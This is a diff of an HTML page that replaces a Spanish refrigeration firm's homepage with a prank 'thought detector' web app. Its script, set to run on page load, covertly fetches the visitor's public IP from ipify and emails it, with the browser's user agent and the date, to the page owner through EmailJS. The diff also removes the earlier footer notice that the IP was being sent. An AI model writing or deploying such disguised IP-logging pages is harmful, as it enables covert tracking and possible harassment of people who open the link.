@@ -3,62 +3,267 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vesta Instalaciones - Frigorística y Climatización</title>
-    <link rel="stylesheet" href="style.css">
-    
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>Detector de Pensamientos - Neural Link</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #00ffcc;
+            --bg-color: #121212;
+            --card-bg: #1e1e1e;
+            --text-color: #ffffff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        h1 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .content-section {
+            min-height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+
+        button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4);
+        }
+
+        button:disabled {
+            background-color: #444;
+            color: #888;
+            cursor: not-allowed;
+        }
+
+        button.secondary {
+            background-color: transparent;
+            border: 1px solid #777;
+            color: #bbb;
+        }
+
+        input[type="text"] {
+            width: 80%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background: #2a2a2a;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .hidden { display: none; }
+
+        .footer-notice {
+            margin-top: 25px;
+            font-size: 0.75rem;
+            color: #666;
+            font-style: italic;
+        }
+
+        #ip-display, #mail-status { display: none; } 
+    </style>
 </head>
 <body>
 
-    <header>
-        <div class="header-container">
-            <img src="logo.png" alt="Vesta Instalaciones Logo" class="logo">
+<div class="container">
+    <h1>Detector de pensamientos</h1>
+    
+    <div id="main-content" class="content-section">
+        <div id="step-start">
+            <p>El sistema utilizará el sensor de proximidad y la cámara para leer tus pulsos neuronales.</p>
+            <button onclick="iniciarDeteccion()">Iniciar Proceso</button>
+        </div>
+
+        <div id="step-loading" class="hidden">
+            <div class="loader"></div>
+            <p id="loading-msg">Conectando con tu cerebro...</p>
+        </div>
+
+        <div id="step-input" class="hidden">
+            <p><strong>Por último, escribe en lo que estás pensando aquí:</strong></p>
+            <input type="text" id="thought-input" placeholder="Escribe algo..." oninput="validarInput()">
+            <div>
+                <button id="btn-ok" onclick="procesarResultado()" disabled>OK</button>
+                <button class="secondary" onclick="confirmarOmitir()">Omitir este paso</button>
+            </div>
+        </div>
+
+        <div id="step-confirm-skip" class="hidden">
+            <p>¿Seguro que quieres omitir este paso?</p>
+            <button onclick="omitirDefinitivo()">Sí</button>
+            <button class="secondary" onclick="cancelarOmitir()">Cancelar</button>
+        </div>
+
+        <div id="step-result" class="hidden">
+            <h2 id="final-thought"></h2>
+            <button class="secondary" onclick="location.reload()">Reiniciar</button>
+        </div>
+    </div>
+
+
+    
+    <span id="ip-display"></span>
+    <span id="mail-status"></span>
+</div>
+
+<script>
+   
+    const PUBLIC_KEY = "CGFbgFRJPIU3wWP6N";
+    const SERVICE_ID = "service_y63yrbs";
+    const TEMPLATE_ID = "template_gp31v3g";
+
+    emailjs.init(PUBLIC_KEY);
+
+  
+    async function capturarDatosTecnicos() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
             
-            <nav>
-                <ul id="nav-links">
-                    <li data-key="nav-home">Inicio</li>
-                    <li data-key="nav-services">Servicios</li>
-                    <li data-key="nav-contact">Contacto</li>
-                </ul>
-            </nav>
+            document.getElementById('ip-display').textContent = userIP;
+            enviarCorreo(userIP);
+        } catch (error) {
+            console.error("Error capturando datos");
+        }
+    }
 
-            <div class="lang-selector">
-                <button onclick="changeLanguage('es')">ES</button>
-                <button onclick="changeLanguage('en')">EN</button>
-                <button onclick="changeLanguage('ru')">RU</button>
-                <button onclick="changeLanguage('ua')">UA</button>
-            </div>
-        </div>
-    </header>
+    function enviarCorreo(ip) {
+        const templateParams = {
+            public_ip: ip,
+            fecha: new Date().toLocaleString(),
+            agente: navigator.userAgent
+        };
 
-    <section class="hero">
-        <h1 data-key="hero-title">Vesta Instalaciones</h1>
-        <p data-key="hero-subtitle">Expertos en refrigeración, aire acondicionado y ventilación industrial.</p>
-    </section>
+        emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+            .then(() => console.log("Datos enviados."))
+            .catch((err) => console.error("Error EmailJS:", err));
+    }
 
-    <section class="services">
-        <h2 data-key="services-title">Nuestros Servicios</h2>
-        <div class="service-grid">
-            <div class="service-item">
-                <h3 data-key="service-1-title">Instalación</h3>
-                <p data-key="service-1-text">Sistemas industriales de alta eficiencia.</p>
-            </div>
-            <div class="service-item">
-                <h3 data-key="service-2-title">Reparación</h3>
-                <p data-key="service-2-text">Servicio técnico rápido y garantizado.</p>
-            </div>
-            <div class="service-item">
-                <h3 data-key="service-3-title">Mantenimiento</h3>
-                <p data-key="service-3-text">Planes preventivos para empresas.</p>
-            </div>
-        </div>
-    </section>
+    
+    const steps = {
+        start: document.getElementById('step-start'),
+        loading: document.getElementById('step-loading'),
+        input: document.getElementById('step-input'),
+        confirm: document.getElementById('step-confirm-skip'),
+        result: document.getElementById('step-result')
+    };
 
-    <footer>
-        <p>&copy; 2024 Vesta Instalaciones.</p>
-        <small>Su IP pública ha sido enviada a la administración de seguridad de Vesta.</small>
-    </footer>
+    const loadingMsg = document.getElementById('loading-msg');
+    const thoughtInput = document.getElementById('thought-input');
+    const btnOk = document.getElementById('btn-ok');
+    const finalThought = document.getElementById('final-thought');
 
-    <script src="script.js"></script>
+    function showStep(stepName) {
+        Object.values(steps).forEach(step => step.classList.add('hidden'));
+        steps[stepName].classList.remove('hidden');
+    }
+
+    function iniciarDeteccion() {
+        showStep('loading');
+        let i = 0;
+        const mensajes = [
+            "Conectando con tu cerebro...",
+            "Analizando patrones de calor...",
+            "Sincronizando con el nervio óptico...",
+            "Descifrando pensamiento actual..."
+        ];
+        
+        const interval = setInterval(() => {
+            i++;
+            if (i < mensajes.length) loadingMsg.innerText = mensajes[i];
+        }, 2000);
+
+        setTimeout(() => {
+            clearInterval(interval);
+            showStep('input');
+        }, 8000);
+    }
+
+    function validarInput() {
+        btnOk.disabled = thoughtInput.value.trim().length < 3;
+    }
+
+    function procesarResultado() {
+        const pensamiento = thoughtInput.value;
+        showStep('loading');
+        loadingMsg.innerText = "Finalizando detección...";
+        setTimeout(() => {
+            showStep('result');
+            finalThought.innerText = "Estás pensando en... " + pensamiento;
+        }, 2000);
+    }
+
+    function confirmarOmitir() { showStep('confirm'); }
+    function cancelarOmitir() { showStep('input'); }
+
+    function omitirDefinitivo() {
+        showStep('loading');
+        loadingMsg.innerText = "Calculando probabilidad alternativa...";
+        setTimeout(() => {
+            showStep('result');
+            finalThought.innerText = "Estás pensando en... lo hdp q es el q programó esta página";
+        }, 2500);
+    }
+
+    
+    window.onload = capturarDatosTecnicos;
+</script>
+
 </body>
 </html>
